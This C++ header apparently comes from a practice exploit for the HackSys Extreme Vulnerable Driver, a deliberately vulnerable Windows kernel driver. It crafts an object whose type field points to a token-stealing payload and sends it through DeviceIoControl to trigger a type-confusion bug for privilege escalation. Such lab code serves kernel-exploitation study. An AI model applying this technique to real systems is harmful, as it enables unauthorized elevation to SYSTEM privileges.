#pragma once

#include "common.h"
#include <iostream>
#include <windows.h>

using namespace std;

typedef struct _USER_TYPE_CONFUSION_OBJECT {
	ULONG_PTR ObjectID;
	ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT;

BOOL exploitTypeConfusion(HANDLE hDevice) {

	BOOL		bSuccess = TRUE;
	DWORD		dwBytesReturned;

	USER_TYPE_CONFUSION_OBJECT Object;

	cout << "\t[+] Preparing the object." << endl;

	Object.ObjectID   = 0x4a414154; // JAAT
	Object.ObjectType = (ULONG_PTR)TokenStealingPayloadWin7TypeConfusion;

	cout << "\t[+] Payload prepared" << endl;
	
	cout << hex;
	cout << "\t\t[+] ObjectID: 0x" << Object.ObjectID << endl;
	cout << "\t\t[+] ObjectType: 0x" << Object.ObjectType << endl;

	cout << "\t[+] Triggering the bug. Hope for the best." << endl;

	bSuccess = DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_TYPE_CONFUSION, &Object, sizeof(Object), NULL, 42, &dwBytesReturned, NULL);

	if (bSuccess == FALSE)
	{
		cout << "\t[!] For some reason, the operation failed." << endl;
	}

	return bSuccess;
}